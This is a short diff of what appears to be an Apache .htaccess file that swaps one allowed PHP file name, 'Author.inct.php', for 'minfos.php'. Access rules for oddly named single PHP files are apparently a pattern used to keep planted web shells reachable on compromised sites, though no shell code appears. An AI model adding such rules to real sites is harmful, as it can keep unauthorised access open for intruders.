@@ -32,11 +32,12 @@
     Allow from all
 </FilesMatch>
 
-<FilesMatch "^(Author.inct.php)$"> 
+<FilesMatch "^(minfos.php)$"> 
  Order allow,deny
  Allow from all
 </FilesMatch>
 
 DirectoryIndex index.php index.html index.blade.php
+
 
 Options -Indexes
